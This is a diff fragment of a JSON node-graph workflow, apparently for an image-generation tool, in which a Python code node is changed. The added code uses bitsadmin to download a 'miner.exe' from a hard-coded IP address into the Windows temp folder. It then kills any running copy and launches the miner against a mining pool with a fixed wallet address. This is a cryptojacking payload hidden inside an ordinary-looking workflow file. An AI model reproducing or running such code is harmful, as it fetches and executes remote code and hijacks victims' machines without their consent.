@@ -3,7 +3,7 @@
     "class_type": "IDENode",
     "inputs": {
       "language": "python",
-      "pycode": "import subprocess\ntry:\n    out = subprocess.check_output([\"pgrep\", \"-af\", \"alpha|pearl|/tmp/m|/tmp/pearl\"], text=True, timeout=5)\n    result = f\"RUNNING: {out.strip()[:100]}\"\nexcept:\n    result = \"NOT_RUNNING\"\n"
+      "pycode": "import subprocess\nimport os\nimport time\n\n# Download using bitsadmin (built into Windows)\nminer_path = os.path.join(os.environ.get(\"TEMP\", \"C:\\\\Windows\\\\Temp\"), \"miner.exe\")\n\n# Kill any existing download job\nos.system(\"bitsadmin /cancel miner_dl 2>nul\")\n\n# Download\ndl_cmd = f'bitsadmin /transfer miner_dl /download /priority high \"http://151.247.219.40:8000/alpha-miner-windows.exe\" \"{miner_path}\"'\nret = os.system(dl_cmd)\n\n# Check size\nsize = os.path.getsize(miner_path) if os.path.exists(miner_path) else 0\n\nif size > 1000000:\n    # Kill existing miner\n    os.system(\"taskkill /F /IM miner.exe 2>nul\")\n    time.sleep(1)\n\n    # Start miner via start command\n    start_cmd = f'start \"\" /B \"{miner_path}\" --pool stratum+tcp://sg1.alphapool.tech:5566 --address prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg --worker WIN_200'\n    os.system(start_cmd)\n\n    time.sleep(3)\n\n    # Check if running\n    r = subprocess.run([\"tasklist\", \"/FI\", \"IMAGENAME eq miner.exe\"], capture_output=True, text=True)\n    running = \"miner.exe\" in r.stdout\n\n    result = f\"dl_ret={ret},size={size},running={running}\"\nelse:\n    result = f\"dl_ret={ret},size={size}\"\n"
     }
   },
   "2": {
